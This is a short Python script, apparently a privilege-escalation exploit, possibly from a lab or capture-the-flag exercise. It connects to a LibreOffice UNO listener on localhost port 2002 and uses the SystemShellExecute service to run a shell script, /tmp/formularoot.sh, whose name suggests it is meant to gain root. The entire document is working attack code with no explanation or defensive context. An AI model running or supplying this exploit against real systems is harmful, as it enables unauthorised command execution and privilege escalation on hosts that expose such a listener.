#! /usr/bin/env python3
import uno
from com.sun.star.system import XSystemShellExecute

local = uno.getComponentContext()
resolver = local.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver", local)
context = resolver.resolve("uno:socket,host=localhost,port=2002;urp;StarOffice.ComponentContext")
rc = context.ServiceManager.createInstance("com.sun.star.system.SystemShellExecute")
rc.execute("bash","/tmp/formularoot.sh", 1)
